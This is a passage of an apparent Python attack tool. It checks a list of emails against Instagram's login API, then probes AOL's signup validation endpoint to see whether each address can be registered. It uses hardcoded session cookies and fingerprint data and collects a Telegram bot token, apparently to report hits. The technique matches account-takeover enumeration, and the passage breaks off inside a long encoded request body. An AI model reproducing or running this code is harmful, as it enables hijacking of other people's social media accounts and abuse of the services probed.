        with open("username1.txt","a") as kl:
            kl.write(f'{email}\n')
def aol():
    h = 0
    os.system('clear')
    token = input(" 𝗘𝗡𝗧𝗘𝗥 𝗕𝗢𝗧 𝗧𝗢𝗞𝗘𝗡 : ")
    iid = input(" 𝗘𝗡𝗧𝗘𝗥 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗜𝗗 : ")
    os.system('clear')
    print(logo)
    for files in open('username1.txt',"r").read().splitlines():
        email = files.split('\n')[0]
        tik = email.split("@")[0]
        res = requests.post('https://i.instagram.com/api/v1/accounts/login/',headers = {
"cookie":"mid=Yv-bGAABAAHbtYpz4QnwEnkdbCE8; csrftoken=DxM0ocw6vCs8neuv2VHTwvjwQC3xuTJL",
"user_agent":"Instagram 6.12.1 Android (30/11; 360dpi; 720x1339; samsung; SM-A022F; a02; mt6739; en_GB)"},data = {
'ig_sig_key_version':'4',
'signed_body':'043786d728db32faeffc465850d761d89867818e36fe42e8ebea347884b66b5e.{"username":"'+email+'","password":"osjwjww","device_id":"'+uid+'","guid":"20d06c67-b663-48c8-9c29-86e7f1be21e8","_csrftoken":"DxM0ocw6vCs8neuv2VHTwvjwQC3xuTJL"}'}).text
        r  = requests.post('https://login.aol.com/account/module/create?validateField=yid',headers = {
"accept":"*/*",
"accept-encoding":"gzip, deflate",
"accept-language":"en-US,en;q=0.9",
"content-length":"19282",
"content-type":"application/x-www-form-urlencoded; charset=UTF-8",
"cookie":"A1=d=AQABBAhPuGMCEPQopi65ZgSNHrDhZNB2gzUFEgEBAQGguWPCYwAAAAAA_eMAAA&S=AQAAAll4ZyUqac33PKB_kTtE-MA; A3=d=AQABBAhPuGMCEPQopi65ZgSNHrDhZNB2gzUFEgEBAQGguWPCYwAAAAAA_eMAAA&S=AQAAAll4ZyUqac33PKB_kTtE-MA; A1S=d=AQABBAhPuGMCEPQopi65ZgSNHrDhZNB2gzUFEgEBAQGguWPCYwAAAAAA_eMAAA&S=AQAAAll4ZyUqac33PKB_kTtE-MA&j=US; AS=v=1&s=K5NpZsmS&d=A63b9a089|og9UbEL.2SqnoPsyAcwVA6bCn_h_SHFudTH1UU98OXrJgFTTR7AW21dULTdQ4Q9mqAB204_9o0tAPggHuKyt2Oo5THj8knptAUwkgif0nUL7CXruGhHv1gIi9_ezb2QIrXAYixfxXH.ci9HN6ngeyzh3VbhKQMMyrkwqZvW5GIFaV_tE0yEzQ1NK77AWBNjp.ByTnHDPUYEJJHr2jWptmctnWMLyws6tyl1_7Lg23g9s2cOJ6h0iLIwVvgIwKjCa7xqSESegz9sIoDYFl7lh_hvt55PBvfdiJ3VKZakSA25egShKMMkv.pBdeJ5R7V.qbIQzbMTV6lcyUC8tnLbNEcPMmOa9NDsfQjuqXsbzsC0TbyUz7NnU38_wDAyKx6Uc5jI6XL0ZDrisPtxS0SexDNCTQHCsHlpgZCw0ygbbRxgM8bAGY3JCla6gBwg0zaBfWAwOkBN.pXQTiSz0_jbr_9W9Snvj4uzbiJmr7tabMQ4bvwho4iTfMdIvAgeW0MBGIdSr_FhhKm2o6ULWhT9bPUXFlUMCMtVv0e25.pGeaLIWOXoRwZDVX9khh4j5QUhBGLvH9E6qG1L54XDlMKIWlCh5C5msBeCC6l84Vx42575DW7mI6AaTJsEoj8AsghBLEnVsWYlQ0_uXg2olegGklYBvy8zQGyjbR3PZguwSPPY8h1Eklf3TXLM9PP9HVC88QM5MR8z5NoO.O4WPagIa_3RlSdGKABfEzVSnOY0c9dvs3z4pFrgiSIwm5Eb7CscFApRLtjUqc3PPObRAGHtrkccrrIbzvdZIO09C0M0ozkJ6MWHI23LuiZSTKVKJBtZIVuNsrYkOX3O11kJe_pNunQVCfQoNQko3LXYKolvjzhAAndwpfFCfuQK.CLfK75Fjb0gQDVyVZ9rLBUaNVfKwFQGkNABCbNbU7saPpSdG6mViVNTa~A|B63b9a09f|MqG24JL.2SrRs7QBXFacKC5u.4Yu6EGlmjAezDN2if6BPx0bFFW89kNCANd5rLoCyFG1SzVgufbFxMajdkgBGqJ.UihSUl4q.0Xs6QnN5ZLQGD2PdcUf8Ic9fUtJsWR6Hgc7Hs1f4l310rm9GUdp_MxRW722XwC3xu4yUm1ZahWiAb3psj0kB9HsQjqW8CHe0BghcN9GavqtkEXgtHbvWCerrJswE_VL440ecQoXwmlvpJwpATCI0b7VYiphRm0o7daXbhbrQ5fSrFZS09sXjXavQ6muXb3.rCs9qVO0kStPlbNCTwToSGrWzGj7JZEdaRpnLVje0qRb5qtnhnmmxcTpHCygUoB.MHMVklDyZhtFQ31mdIhLsi2LBKwI.0DAJdrq9R_83tO7AQ2vzA2E.Aad9KW8WR1p4c2_1xmHL7.P032RMA0P3sN6nJSbuAn2dj5pal_.0N3DfbSNLoPddzOZXTL_aaqcmbPds_2ZHRUVAY4wJ7dCYnJ7mMWBR4fBGW0gvenrQJk3j_We2nIi9EfZ9iaHKaa7bd9y1oyZP9RD.VBpb3Ei7hHU6NGxL6PgZeOwa7wLV_wQsWVb66KoQcIa8vxU9HvWsIctHw9UIx.fvnipQnnqXZkjuQaGrIN1jFy1pwobezIz22xppVNQ6eQD8sX57QkKtSr_6rNx_y_6OXdiK4t_HjLMAs0WuuBucc7zQqfZgoUaxyeRRPtHpAURYZaJbYPJfM9VB7K4CmwYnv0.7UonwYhaoafYbHoFZf9_butqjuyhZTUgWVvzD_oix5Hus9gmCQ0zfubbtiAnLyAQPgOOm3jnvfIAaR.SNq5vfk4BTawUokcf6mmsSblhf1hD5Kwgwuzu_imar91F9PRbsETm6SKmlgWmTw0TV3okSzxI_UiVlZ603d22Ku1r_aKXtNBRmubSRfIi5RQ-~A; rxx=28favbiairs.2zsg946a&v=1",
"origin":"https://login.aol.com",
"referer":'https://login/account/create?lang=en-us&src=mail&activity=default&pspid=1197803637&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3Ddj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--%26language%3Den-us%26nonce%3D8oqUMyv99HvDiKg9WdzrsJHH40p6W66f%26redirect_uri%3Dhttps%253A%252F%252Foidc.mail.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2Bycal-w%2Bopenid%2Bopenid2%2Bmail-w%2Bmail-x%2Bsdps-r%2Bmsgr-w%26src%3Dmail%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vbWFpbC5hb2wuY29tL3dlYm1haWwtc3RkL2VuLXVzL3N1aXRlIn0.K15qdgw15ZmjBPnBSygIPWo0bye2YGHfBdL3UF7yB-azbtVLYxBrvyZw_j5ctu3OiMi-jNP0YDkw1rC0PmK0dY9oulwUqGVvMfh9oxa6HsNUNNooLbplvkmS6Wzx6ktbdiRQUrXixzRZwoa_N7SKBda9AeeHMICuYya128nTz20&specId=yidReg',
'sec-ch-ua':'"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
'sec-ch-ua-mobile':'?0',
'sec-ch-ua-platform':'"Windows"',
'sec-fetch-dest':'empty',
'sec-fetch-mode':'cors',
'sec-fetch-site':'same-origin',
'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
'x-requested-with':'XMLHttpRequest'},data = "browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A8%2C%22timezoneOffset%22%3A0%2C%22timezone%22%3A%22UTC%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A5%2C%22hash%22%3A%222c14024bf8584c3f7f63f24ea490e812%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Google)~ANGLE%20(Google%2C%20Vulkan%201.3.0%20(SwiftShader%20Device%20(Subzero)%20(0x0000C0DE))%2C%20SwiftShader%20driver)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A1%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A10%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221296%22%2C%22h%22%3A%22600%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22560%22%2C%22h%22%3A%221296%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1673023277621%2C%22render%22%3A1673023275990%7D%7D&specId=yidreg&cacheStored=&crumb=AKoXB3J2T7b&acrumb=K5NpZsmS&done=https%3A%2F%2Fapi.login.aol.com%2Foauth2%2Fauthorize%3Fclient_id%3Ddj0yJmk9VlN3cDhpNm1Id0szJmQ9WVdrOVdtRm1aMVU1Tm1zbWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD1mYQ--%26language%3Den-us%26nonce%3D8oqUMyv99HvDiKg9WdzrsJHH40p6W66f%26redirect_uri%3Dhttps%253A%252F%252Foidc.mail.aol.com%252Fcallback%26response_type%3Dcode%26scope%3Dmail-r%2Bycal-w%2Bopenid%2Bopenid2%2Bmail-w%2Bmail-x%2Bsdps-r%2Bmsgr-w%26src%3Dmail%26state%3DeyJhbGciOiJSUzI1NiIsImtpZCI6IjZmZjk0Y2RhZDExZTdjM2FjMDhkYzllYzNjNDQ4NDRiODdlMzY0ZjcifQ.eyJyZWRpcmVjdFVyaSI6Imh0dHBzOi8vbWFpbC5hb2wuY29tL3dlYm1haWwtc3RkL2VuLXVzL3N1aXRlIn0.K15qdgw15ZmjBPnBSygIPWo0bye2YGHfBdL3UF7yB-azbtVLYxBrvyZw_j5ctu3OiMi-jNP0YDkw1rC0PmK0dY9oulwUqGVvMfh9oxa6HsNUNNooLbplvkmS6Wzx6ktbdiRQUrXixzRZwoa_N7SKBda9AeeHMICuYya128nTz20&googleIdToken=&authCode=&attrSetIndex=0&specData=iOiNmCwRKrTV1yLRFJXssgMIGJytJbmh6ENaiuVkRzyP%2FrVavzW5vn0QCvB1OXdk7Ng3FW%2BlkoGtTIoVTJF2Y4Bnl2ROO4L0L0HcQnXdGs0FzF%2BEEzXCOFJeB3ReUGcScCaXT4yaOldGHqfGaA4VwenkyS7ewXsYP48eb7ykF8S3lCFYcV%2BZpwOccQutU4Tn%2FKAlZxHEZ6pPX4kW2MuT5D8oFyinzBg9qsVL%2FsmotyVxclkVJGiXZfodyV7f3a6tG2iil%2BaqVHKynhUViBH%2BPxL970uq4VfgORfx6s1Yje%2BTnN7KZw%2BO%2BdVo3SxNfsirf9RCz0KuacWB88Z1nA46YFZ0J0eA0p6pzBdMeNiWW4xxsIczzCCnGte2aKcgA2%2FMIiS0oX0FNDyNdA%2FQ0Pv1uKcVvb7fHW2ajI%2BrK2DHlkjIXtkPKgH3NtV%2FSdXDrLhkA5LrpDGd%2B1aKrDj6Refn8oVsyq0oI75scWUtSkVZWPp4GcYIv0hz7QK4WGh2JNPhvAB%2BOll7Og9WORUnbO%2F3khSehIlSxkS4zMbp6cRUbn9HlDss636u%2FSJVqJYa7W2%2BUbLgN4Pq7tW5R3DBb8rwgHga%2B3ZAlHqEnHdEXmj5OSpvOdLxx1h5ExqRgx9x52uqe3jpuRIfs9olV%2FQ3XHzPhoq5kRVwJn6yWm6FrpBD41Q9%2BFnrTRiGnHC6NOBBAM8%2B%2FVV6O8UAQd4qszv5Bwhe%2BJEDF%2BHgVV9OEmJeYa99S%2B22lTkA2UheAmsVfHmlW%2BpMd36t%2FapwrWFc6h084M4UFZGYdtAseDNagU9VTOgPYobDpBpyZhj44sZgoceiATc8qXSrjhLnn6S%2BF53bEUU7qWYSGUP85LL3nIGORX13W4CDtsDyTnPMaqXDIz3zHWgiZp02JOeYl5r0Efc4qizAoqrjO5ViRN66Tx3VevHAHkf0%2B9gcqi2AcAwEfv0IfD8EJk3YUQ1AL9gmFb92t3z0erdShag%2BIYMCA9kj1hy7tCjZgMx1VtsUVzJomhFH0TSgFSyhDnE6kU%2Bv9RGWRRyVj7UjheGyZrmyS5zzbdLsQOZD6bWL21MSFhhqfA4%2FukhFg9CBzPW32A5mZrz7AJxnJSR88I3ELXbEQrEMS4oKn7jyzcab2elsvLpfQTCL2X53v6KR4lE0zCRQ5QdsjEGEsPen%2FhRhm37%2F5icW6u%2FP2D%2B1G0eNOhY7Q6tCRd73ImWM%2BNb9oeAaFThNWi13aM%2B64SPZwg9QHarp4fxah%2BaUJKJ5aJVD0y5BFb6USrcNpYYGEhKOlR%2Br1FlZ8ziy2yluD%2FZjPZ77ibbwiBqmGtRruJ2ChdmyIMhkzI5qp2IAYiUTzvrRaKPZ2oI3q4gl6%2FlwjfNHu7RPUpBepa1CLXDUjp0zFN6YkF%2BpLOj5aZDEjD8U8yJ3oX5YKkt2XchatMBUw4UiBZyJqbFmLnjtqcH943puziv7q8RCnVANHAMslaqx3VyOcCWn902zKPD43Kb4Yf12O7EYusULwEGzerocjEw29HC4D%2FijRau1FGTkkFqKNjBWHeGFc7h7dnf6WwtbShZ7QzHKed42gxanqVfab7p95ghu%2Frx6Bw5KSnq2P90M3iqXW0hatchk7jZA9UYphrWZeIDq4qo25muGsVVDYZi9sErlv4xyWmBKOloT84sKxq1wZNw3O%2Fw6jtLDksGvWqaze%2BnWGmf7rT3jPRlL%2BBnDWum2oKb2EZUD%2FGIvpq5d6zuohwzJ9ubipqhp8eJlB1PniWK0NfXNLJW0pAt%2Bz7l1f4XbF3XZtjZifQBcl05DL%2FRHMr3AXwdHZzzJ7SWJzTRnKWSVmGJ%2BlAkPniXvqPPXtI6xkO6zx%2FDsXKurCs7aQH7gwaD2XDdrX0bX40aChXOkf7xGqBJdOHe3UVjr3SvBmrxDzZS%2FOfKTyKxOPFARzkXN7BJp2gb0zw54Yq6mxR56qiWT71UeheABIPg30VWdZCn%2FGr%2FV%2BNxG9Zy9J%2F9ez7oxytnJxGNpig9MZSpWagNwZW2M8yXCafu4zFTgGh%2Bn4ZmZ9jLr60e2y9rDPQsGdDPKu3WKZO8%2FnRz03v1QVNwGbP%2F8QBnqdeWAv4cY7hytDyZb5ZFuxUQf7OCGFmeUHWd2JEK1bs%2Ffja4cxdUv8pIWgX89F90TReC4GPulw9tjk6Wzpg6oaue3IwvSCMRN2NuGUGaiiEI79iIN5W4RRwiXJ9GxnygOhSNRoq2xMZ4mLXYJhH%2FLp7Ih6LK5DYmxamMCi3a72Fzz4kJ9qGNQmbgW7AO8H3fK6MvBs9vL%2BrotIdEnZ0hUyuY71WtY%2FA6WQgi7%2B8TrAF8mCyCMwfyyyKQjc69uwmkv26RPUJeuRTd7Cx%2B4XYEwxUY76jh9tdjE%2BblIpkhtmpJzQUpbmV6HP7jFc%2BCtgjV%2FX%2BkAwVpm8DpzRg241XykighLy50%2FlfkoLPJ0K5DyrC%2FCrg73O7Qhq5qdx5cldNBnHZLOC%2BMqd%2B8AJYhliXrhuTypOzSVT8mNlqP%2FF2IHEfNu9AwR%2FkiwGhWxChuaojkoQNPF%2BdhNNExE3B2KSEBW7dxbcSrIl2zK07NMnzZE7zzKdeQi3XW2t8Nq6yGo83T8h5By9KpNoowUplkOSUr7vROweYh0g7JHuqH4qch7TE%2Fr2h5LopFIWVKqb40B%2FzgCvZe6viiRVRjVtxbmDKVtC19%2F204LFLUgCSeFZdID37as68HYhea0GhuqPfpm3O52LyXrBV5NkLHwQlnNAX1A0rY%2BJySOERv%2BY1zO8k9KPr%2BQGqNFQqBd68%2BRkWX5JtbrANuFoxUIDTBrU2Y0qhboeoNn83xebBYcR0hc4XcUGQ%2F0Zndah9wlo%2BDaY9N9RaAq%2FwbSSDIzNWUiWTqA6kB0x6jEMFer8DTv1FSKGexGIlkVvJTXphPJWF4Skz55dFDz3wGV%2FyuTj5q7C0hshBGzNufZMfFVARy%2F5qKLkE8Mns8IYvksAhSyWZ1NmzxfDa29qvwHdJGmW6JrE48PstHDPUdZi%2Bd%2BsL6apErGwfaTplGY678VV%2FHJZkqQB83dK2VDO6GSrlrhtyff7WjHWnfzoGhyuyYDJTf1zPSHcuJnwxwAqMa3q7nPlfZcIBBjFJuJPGfhD6HgIFgJfknY7kg7UpjW13%2B1HFrJ6RZhP8lsw8iFiSv3yXa2lqS7ahp%2BHbVPKBfET2jtKnvOrll4W4OPyq8dO5%2F1GApl%2BP0%2BCst5Uq%2FrFni6xPC7hJIe%2BNkMrXBo415QtMW1Z%2BYns1VzT%2FOZe71iBR3C5kgt8E1sLo3M2qimf5yU2wdOcUl4MULJSOtSN13YjA2Oticp4krJvHtBMKDmDYAl0IMnuD0J6e6QpIcpIiOylacwi1NbyAwDnR%2BW9k%2FngaH3DOUB%2BOhkQn2yYpGf%2FOvXO20rQDJx5qrsNqg%2FIDuwT1BdOWiaoe8GttpWlIzbN99oGjShzWUT%2FEbbN%2FuGOo3MoRJ6zNlhbMwey0ImkdVsIO%2BYZ%2Fa7dWGNamUfTSWFxTblQH4NIk2I8k0s6UFXGRU0QxViaXciXMu4jSxhYNXSdwPlDJvXq8jX%2FI9GJTPQlnTSBbeAoQRLLrp1k%2BjW3%2F8GZE0TfrrkJ3LbYg2EvRyWtbSwEIP2Iem7X96OSWoxBdnnrgj3LK%2BE8F4puR8RMU%2B6hhyDJlZ8dw9bRGI6BK1qXFjGHQoaUzUZKwQ%2Bbm6Q7sf9b%2BftFWueykue%2FJPEBNeT%2FspYOBggbaWyIQaCDmvWK1adyAKFMR51eGCCdIcDMlyEPYZl4Y4soY2OTVfC48VRiuUlVdwcAI61EtmeFQNndKHsgf%2B3ffiKMr6RseDeqaa6aSbJQDlAEOgbwYfjHSwsek4%2FtUqGF6RSViykO7tDvwQFVXkxxyHbmxOPCDXWnVRbWSuWddvQlyyjzJmh0IGBQuZnNmTWVr6TMebwAHG92xOztpmOBx8Gc08Jz46hLkyWEi%2FMIDbj%2FE1TRIpfFvg%2FguVSzasxOtBfTR%2B2ivbRbjajTWD4USe7KdXKL6PXsgiJS02%2Fk52N4B9bMTPYal30aS8ixqkUJDWJuGIdRXGOwSmEwuvDRDDR%2BvEagRUeNJrDlCqjGIu6UZD8cgm9qFbeLTr5kxyvu%2BGMY0okPdtjjZBt0wXnZ%2FWaG4cR0J0W2DDO5r1mXfmprCg%2Fa07VfNp0gtl6dTxbL0VHgawSnvPY0qG4Rrpi1ecFL7qq32fZp17dXXqfNuMVzIpOB5jGb3cXDWzXCbcOTpAJwz3VigEnywbERpM0kubAMayMutq2zaJwYXUJxhoL796OzfYPJYm9k623YHbQBiGokk%2Bv1k7HKetFVW%2FLYZN77KTrWgyiqy459qWgRJR7roFxqKrmTR10jGemCSuOobBr9Iq5NQYt7h778eoz0htF2GAWu57Zi5DwhWY8inyb1pL%2B0tGJ0uzoG2wdzoKMhwHw29fOJJyJGTNLwBt%2BwkxTOHWFwEq8L01bhhah16OnQzu0fq3fv9DvKnyffj1iCOUp6o%2FjGXHnfZxseRfEOqLeHvvEMXyxt%2Bue5WascNjoib19LKdSMi4LHFwv%2FxIGNfwkKPK0ZJPh5oU9lPpk%2FvFOG1%2FZeNbTKuOnyMwe5gqiI1yV36x1ofQ8vPSYnkUutqKqH380g7uB5dD2aLLU7zlYJtAZ885R05T%2Bw8T3Iade3rcedpF1KQovSp2QCuQMQkni1IzwlmlgXg2ZAf%2FCKV8BdNbQ%2FmXlVqTeYcaHL%2FPnkX3owWh9kuOLzQL8GoaHsyQllb1xMtV1nABcqz2qUEFY%2BM%2FPWvTlH58E153wGMA3oepSW1hYnwn9%2BceScqCnc3UmB1cInZzBIS96Yta2tni4W0EMV0WJxkNA0qerfqYi1OT4%2F41zZwkw5J1Zy787hl09C9dyLKdBK4hnneOX9L2LW90XMDwqTr%2Bz0hGXNUlXTcITR3H%2B58EWZ0ESvVDH8e6El%2Fany5koCyW83SWmAwq8pAK9YUyYfIFrEgNglKHtl0e0d%2BlSusUxt6Q2F30p2MjGlOmoEgYGn5f0HZkhsjRVAsuKebZUsLD7b7S%2B6ET%2F3qUJOIQNz8BUTiFgF6SbZPolHqxLaTcWFx5%2FrxnfU2Bh%2F%2B21jKIANVaugXIiiZyMydVtMOHfSq%2BqEik1jiP5LR82tKYprATx8DlRM9PjKt2ibk5ivewQ%2B5nId%2BFgHujcoUZ7UF%2FELmqIzEzsy1PjJnoV4PCEhRzfR1l1VMbdXfECeHHDFGXFZsxRfpOC6Q0oj%2F8oJo6HGMCWYtzjyr7Ps6ol%2Bbu2sRAMCwm3onMbMVJdMA9PMKtniXnKfKRSTRoK7L80GkIG%2Fu0ArWBogkXsgZb5Tnv%2FetY2oscbdOpNu1Twoc2U61XPrjM%2FD8JhvyifZnHE9klP1cDG3X%2BgO%2BWNgDWPK%2FMbcBV0Nwf8t7HSMfZhlnnZi%2BJDbW8y2OyUN1pIVuM%2FBfrB075p59CLLkmRT%2B6uYwwY0a9MWd3qcFpIoexlFnP7wlRB22Y%2BudF7%2Bg84rYheocLelkJomFmxxHL%2B4AepqLrGWUU9X7ci%2BoKVKXGi%2FYYjcZyPGqDXpu2A7oAZ7sXWSlK3D10k1%2By0jt3D2akA5pzj6FnEkuOcEo8r1LRAYvRLWJ1OSvgf98c0H0IkSYMHF%2FD5fl4LXa%2FI3dQE1RTkc%2Bd%2Fu%2BScq8DiFYWSBerKYgxcHEO%2BhX2mbxKIXW89Pqf96qrqVSfkPAASWLyWKzsxCkC1unlbU6KaeGFbAj%2FAQTXbMciT%2Bu2qZoZmBDixgqNAuXkNCyyW4HcGRJChc3eeWyVRyOkFPvtWvpnAXGUnED5sVbEy9X2DtuWrjhZzKyO3jHA9qL61LaL%2FLWZ4ic84m68LQPbTDESug4dbolKs7NpzhZxkmF09w%2FztEIyZXE%2BqWdeb5LKAzA2jmwoMFrKXcQ%2BhG6Qdb7mr2HKFWAhd4YuEVy81Mom9P8zZ3Xrms1W5UQ6mBr4WQaL1B8XwefKx%2FRE9kWzouUiuCRUaeRELdhGfnXbaCWN09WVWyahcz%2FDbU6%2B4LOPuxtFWPb%2BI0mfPxi6UlRxOaXPWgM239c2UP2zww4aO4P3YiWgVOoNm8%2Bg5ZTCfaKosPF9Xt78YrCinEJs6uzzxDHRSw2bwteiRoErusLigcPmfRhLqa%2FgUovUeM35YuA4unSvK4urvHf1mfqvSyWv6WnNZqUNI%2BKvVsDMSr%2F1j%2Fuy3vm4QgGmzbSoNxFOpR334xZCy8T%2BdvE%2FfvMUVx72pqJ8Fk1NtH02CKh8UOp797jSYlzFTgTz7ynK4cf3cp2k0rCJdeYoaQYPEtrGrkqkvhMYIBQHu4mhuCGI2V17YOIviZB8Bc2TawZsOVtbhdysUkbp6Xx6LTQjiduBvdfosQHmmbNVGgMZgF9L91oosmJZMf8e9Nx%2BDeIRRitk%2BuB7AP2hF1V20ZkD5WcXBl8pFPbnthEBC%2BxekzL8lvRrEiQMug5fidQLyp4Sza%2FNJsdbSsAcnBTANHHPMQthg3VBdWUYynDXzvQJ%2Fvd%2BjVuY4MinVmNpvf%2FQfO8GuRiqonmxc6fuXAX%2Fq48L7TdOiUnV6IoM20qmigxeUSiB0boTO31G%2BBekm6mFqEAgX%2BDAl5%2FpwiLjYd8gU4bh18AUqVtC97kZ8T35jMubEMWCiPfU7UFuHypy5%2BrZFmwQw11mwhqcHGYmywcFWeJMoZJUEi5YxUFiCzofKwYX1%2B1HsAUTrBg3BBzne55SHRyz%2FJ%2BLNYs3LXu6FcAYVierFp37idIeZyllw%2BcFXcmO3s5i2U4iRaNuxccOhNIXxTdhDwwihpWrlqISp6C6BJl%2Fuo1ovtmLVTAxHQ0wSTU8kKGJ3zFLLQXxd3QHH7BgSeI3yucwLcnpyCP205jXq2WI0iicLcUWpGEs0U%2B6XwF4N3fjv0niQxnrIJkBwC%2FIvk0h3Zd%2Bm4Etxzw5skcIdJSqbS4B4Bfb2RmJFI4J4L3UTDTJxmx8YknfTNuCN15xvlFOkX90NUr%2BVOQc%2FjVanwscXmCC8J70OCE%2FtkB3FTnCA2BGVnpdcCKITruszBt5V2GcfN1uMDq5qDBdBjAQ2YczujTbJajWe9KnzOaDIeLZDePEQKox0vTlLwiDtmTH6fvz3UA%2FOzqJV8wv8TbrHdkJ7X7vh3L89iYYMWX7wrKhqT5MsqNcFK9ubZ%2FSWOKuXuRv6iut%2Fki4ZJX6nKidDxVfp4ye%2BxIbs8qWeDy1xqp33K41dP1yUVG5UON68f4ol1099%2FRnv5WKDDDgbn6opoWHYwzQoFZTwRGm2pI3%2Fqs0LyoTlb1kJglK8rYRrl4DghQaMPxVjyKMOl5HAkne1nI8yKqnW%2Bwixf5e36z5C5KIU1zAwBv5k69Ml13axf%2FPl%2BL07Qf76H6FfCIlQ%2FjHld%2FACM6rHFUZnDGEnPee%2FxDMlJEfbtUsi1glhWJWDkxmx%2FIT4GXDTvqP1kRfqicxPTYflq15eXXK5zFZSUXXI9M4xcP2%2B9qvYx1a6qCwYyVfg%2Brgl2QvYWpxXxe5Z%2FS4am4P07LqwowIJ%2BaMKUiNkHgvCdy5o9ff1q3jDsBnXXhVPjtSeUAVXqEdy0t4txIJi3iXQ0HEEm6QIENZOXpuQrUfmsD3xkIRTQHVA4mMhfPxOUziwlXgTwXMwlN9mxwBVo1QAWEpBZExAvbW86IBwBYQ4%2F8rHqbfIKDrXItMyzKoCzou5u1lT18D8n0UI7iVSFzvEIX8%2F9f%2BGozz23E%2F6MKXCFVQHjQaOGqQlixOmgHGCA%2FCBQ66VNCx4%2BikMuPJMPZrV%2BFGtjsCpBrRnkmiottJAbZNLUiG6W%2F8QXmFCYPB8mE8o1kv2Zh%2B%2BqX46atE7nPIaddtpuCEaBShp9xltFB1Cvmjj2pTOxxusOtS9ZLuPYbTHb26encYwJnvZ9aWFZu5PgoEsGoLXrUrYnBgcG9KLIrwAnYCIySbTe6uZqJuhlsOtQd1h7Itv69uy5vQNd86pMNzKJCjDHuz77OmJYagBKYNrrzf3smXZRXMd91t6o6%2FSAeKYuqbnLhld%2F8YtCFEV1ayuzvEoKlcPmtbf3RCYFrywdpH4aScJ8gsA3JhL4K5rQV5BNTh3BXGg9g%2FPJIjfFM%2BjRwHd40DINs7h480R2K1nV2Q5JHRA6IJcG1b%2FBwVQcNig4oijO5R1bqBJlatva17Qxv%2Faj8v6zEZL6UoAE6eX8PZ9A1oQ5Jmbk2S9zpOvX0SGuDsXr7Dc1GlmnzmI1RAPYNv3rtSTREZMxwk0WRRMV6WF23Vs7jUqfESC8lqlyk9PV%2FlU9rp4DwVULn5Op12pC47CMj4Vez8dmB3fX7eHo9OvkTq5wKFOpEyuzrI%2B2ZfXnuw9L0WA1xGsfpv%2FrJzZCnh2LxLmPigu03mOTf6zEXwqUiATSrOer58pgfLtpPoyBFM%2FxOSzRtiUxTRUrgDl9eNUr%2FFMcqntBpUckqYOu%2Fh673b1sPCI%2Bz65BvuF2NfHeJiWlW9xAgxv5eE1yG5FCdVoPiWJRiNVjvqvMc4Rd4gZ2hubkcohPtPydyM7jh8FULBvXb5tSHUlh945luxwCv%2Bc6gKB3F1rE1S0uAtcZUeLncH14pofWY9w6REAe6D%2FkPdu9QSaybR9%2BgUP8Ip5ZScZaZEOWFfcw0mD0AXzYT8uYnmOJ48ivvoimcIYQYnu74OMG3NvnO%2FpyXEYrgfxZ0mNsqWKZp9qeygN5gqtH7GkMwmBwGLs45l%2FcIRX%2BGBy6%2F8JYdgJHqDdeC85sVCkFCB63N1sYATamcyLHflxX5Cb6LDLDZcqEYAuG3kwRo1uGkEqysTq6xJWi0qN6ZqbEk3ixICG5iBD2batkP%2F5XuWZ9E%2FT5lBSffh2fC6Zo%2FL2KrcejHirop4GIPIMJT2KTd%2Ffg43Q8FYN2lGve4BlORmVlAnCKxhTcYH1QmmAijmS0Alpmt6LO%2FSmTwV%2FO656XmYcR2dHLZFnJyhYbYDdbxOkEO7siVSB7rJrIh6EvRX5n%2F7Zm%2FGqQo%2FyxX5B0HUPbk25HH7yBQi8oFprLCBSlolyt%2FVyTMm%2F9WBkS8o9RN3%2FrcQDs9ZdYFoZJ28QbFhIAGq9bX%2FHN7CSKKe8ODnUwSxPGRNH0ta2odEvsZnVVsCZXnQNHAG3cKi1i%2Fdd%2FWWEtx3%2BaaSMrwU3AGmo%2B2tYIOIzN%2BO18K%2FVKX9PP7l7%2Fylu9bJDw2sL99DH%2Be6MDnc%2BbfdIoLxk6vyf8xBSVewQChF%2B8lX5%2Fku%2FT%2BkPamn%2Bo%2F%2BYg5JrBcbdvJD%2FoT%2FdP5zkNd4IGhg2QTEHPZdshhMwVspaMrzE%2FRnF3EgXX1H%2FGTXcpzFirJYVgHsrVVo8hvGnaB4D7eObPdKQrAg2an%2FBtqXVHk3hLurkeB1CFmTCigoB9G8tSG0grIY8CDhUBGwiLl%2FEhS2QK5rUhSzrYrv%2Fw6g0uwy0XfaHpE%2FXSlFKlUy8XKSRRHidFzakgLLO7i8lT6b4Xht